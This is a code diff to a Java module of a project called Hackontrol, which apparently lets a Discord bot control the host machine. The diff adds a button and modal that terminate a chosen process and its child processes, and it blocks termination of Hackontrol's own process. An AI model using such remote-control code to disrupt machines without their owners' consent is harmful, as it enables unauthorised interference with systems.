@@ -10,25 +10,37 @@ import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.manager.interaction.InteractionManager;
+import com.khopan.hackontrol.manager.interaction.ModalContext;
 import com.khopan.hackontrol.manager.interaction.StringSelectContext;
 import com.khopan.hackontrol.manager.interaction.StringSelectManager;
 import com.khopan.hackontrol.registry.Registry;
+import com.khopan.hackontrol.utils.HackontrolError;
+import com.khopan.hackontrol.utils.HackontrolMessage;
 import com.khopan.hackontrol.utils.LargeMessage;
+import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
 import com.khopan.hackontrol.utils.interaction.HackontrolButton;
+import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
 
 import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.interactions.components.selections.SelectOption;
 import net.dv8tion.jda.api.interactions.components.selections.StringSelectMenu;
+import net.dv8tion.jda.api.interactions.components.text.TextInput;
+import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
+import net.dv8tion.jda.api.interactions.modals.Modal;
+import net.dv8tion.jda.api.interactions.modals.ModalMapping;
 import net.dv8tion.jda.api.utils.messages.MessageCreateRequest;
 
 public class ProcessModule extends Module {
 	private static final String MODULE_NAME = "process";
 
-	private static final Button BUTTON_SNAPSHOT = ButtonManager.staticButton(ButtonType.SUCCESS, "Snapshot", "processSnapshot");
-	private static final Button BUTTON_REFRESH  = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",  "refreshSnapshot");
-	private static final Button BUTTON_SORT     = ButtonManager.staticButton(ButtonType.SUCCESS, "Sort",     "sortSnapshot");
+	private static final Button BUTTON_SNAPSHOT  = ButtonManager.staticButton(ButtonType.SUCCESS, "Snapshot",  "processSnapshot");
+	private static final Button BUTTON_REFRESH   = ButtonManager.staticButton(ButtonType.SUCCESS, "Refresh",   "refreshSnapshot");
+	private static final Button BUTTON_SORT      = ButtonManager.staticButton(ButtonType.SUCCESS, "Sort",      "sortSnapshot");
+	private static final Button BUTTON_TERMINATE = ButtonManager.staticButton(ButtonType.DANGER,  "Terminate", "terminateProcess");
+
+	private static final String MODAL_TERMINATE_PROCESS = "terminateProcessModal";
 
 	private SortRule sortRule;
 
@@ -43,14 +55,16 @@ public class ProcessModule extends Module {
 
 	@Override
 	public void preInitialize(Registry registry) {
-		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_SNAPSHOT, this :: send);
-		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_REFRESH,  this :: buttonRefresh);
-		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_SORT,     this :: buttonSort);
+		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_SNAPSHOT,         this :: send);
+		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_REFRESH,          this :: buttonRefresh);
+		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_SORT,             this :: buttonSort);
+		registry.register(InteractionManager.BUTTON_REGISTRY, ProcessModule.BUTTON_TERMINATE,        this :: buttonTerminate);
+		registry.register(InteractionManager.MODAL_REGISTRY,  ProcessModule.MODAL_TERMINATE_PROCESS, this :: modalTerminateProcess);
 	}
 
 	@Override
 	public void initialize() {
-		this.channel.sendMessageComponents(ActionRow.of(ProcessModule.BUTTON_SNAPSHOT)).queue();
+		this.channel.sendMessageComponents(ActionRow.of(ProcessModule.BUTTON_SNAPSHOT, ProcessModule.BUTTON_TERMINATE)).queue();
 	}
 
 	private void buttonRefresh(ButtonContext context) {
@@ -71,6 +85,78 @@ public class ProcessModule extends Module {
 		context.replyComponents(ActionRow.of(builder.build())).queue();
 	}
 
+	private void buttonTerminate(ButtonContext context) {
+		ProcessEntry[] processList = NativeLibrary.listProcess();
+		int minimumIdentifier = Integer.MAX_VALUE;
+		int maximumIdentifier = Integer.MIN_VALUE;
+
+		for(int i = 0; i < processList.length; i++) {
+			minimumIdentifier = Math.min(minimumIdentifier, processList[i].processIdentifier);
+			maximumIdentifier = Math.max(maximumIdentifier, processList[i].processIdentifier);
+		}
+
+		TextInput textInput = TextInput.create("processIdentifier", "Process Identifier", TextInputStyle.SHORT)
+				.setRequired(true)
+				.setMinLength(Integer.toString(minimumIdentifier).length())
+				.setMaxLength(Integer.toString(maximumIdentifier).length())
+				.setPlaceholder(minimumIdentifier + " - " + maximumIdentifier)
+				.build();
+
+		Modal modal = Modal.create(ProcessModule.MODAL_TERMINATE_PROCESS, "Terminate Process")
+				.addActionRow(textInput)
+				.build();
+
+		context.replyModal(modal).queue();
+	}
+
+	private void modalTerminateProcess(ModalContext context) {
+		ModalMapping mapping = context.getValue("processIdentifier");
+
+		if(mapping == null) {
+			HackontrolError.message(context.reply(), "Process identifier cannot be null");
+			return;
+		}
+
+		String text = mapping.getAsString();
+		int processIdentifier;
+
+		try {
+			processIdentifier = Integer.parseInt(text);
+		} catch(Throwable Errors) {
+			HackontrolError.message(context.reply(), "Invalid number format");
+			return;
+		}
+
+		int currentProcessIdentifier = NativeLibrary.currentIdentifier();
+
+		if(processIdentifier == currentProcessIdentifier) {
+			HackontrolMessage.boldDeletable(context.reply(), "Due to security reason, terminating the Hackontrol process is not allowed");
+			return;
+		}
+
+		TimeSafeReplyHandler.start(context, consumer -> {
+			ProcessEntry[] processList = NativeLibrary.listProcess();
+			List<Integer> killList = new ArrayList<>();
+			killList.add(processIdentifier);
+
+			for(int i = 0; i < processList.length; i++) {
+				ProcessEntry entry = processList[i];
+
+				if(entry.parentProcessIdentifier == processIdentifier) {
+					killList.add(entry.processIdentifier);
+				}
+			}
+
+			int size = killList.size();
+
+			for(int i = 0; i < size; i++) {
+				NativeLibrary.terminate(killList.get(i));
+			}
+
+			HackontrolMessage.boldDeletable(ConsumerMessageCreateDataSendable.of(consumer), "Successfully terminate " + size + " process" + (size == 1 ? "" : "es"));
+		});
+	}
+
 	private void selectMenuSortType(StringSelectContext context) {
 		SelectOption option = context.getSelectedOptions().get(0);
 		this.sortRule = Enum.valueOf(SortRule.class, option.getValue());
@@ -80,7 +166,7 @@ public class ProcessModule extends Module {
 	}
 
 	private void actionRow(MessageCreateRequest<?> request, long... identifiers) {
-		request.addActionRow(ProcessModule.BUTTON_REFRESH, ProcessModule.BUTTON_SORT, HackontrolButton.delete(identifiers));
+		request.addActionRow(ProcessModule.BUTTON_REFRESH, ProcessModule.BUTTON_SORT, ProcessModule.BUTTON_TERMINATE, HackontrolButton.delete(identifiers));
 	}
 
 	private void send(IReplyCallback callback) {
